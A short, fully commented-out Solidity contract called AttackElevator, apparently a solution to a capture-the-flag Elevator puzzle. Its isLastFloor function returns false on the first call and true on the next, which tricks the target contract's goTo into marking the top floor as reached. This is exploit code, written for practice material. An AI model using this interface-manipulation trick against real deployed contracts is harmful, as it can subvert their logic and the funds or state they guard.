// // SPDX-License-Identifier: MIT
// pragma solidity ^0.8.0;

// import './Task.sol';

// contract AttackElevator {

//     uint top;
//     address public owner;
//     Elevator victim;

//     constructor(address _elevator) {
//         owner = msg.sender;
//         victim = Elevator(_elevator);
//         top = 0;
//     }

//     function isLastFloor(uint) external returns (bool) {
//         if (top == 0) {
//             top = 1;
//             return false;
//         }
//         return true;
//     }

//     function attack(uint floor) public {
//         victim.goTo(floor);
//     }

// }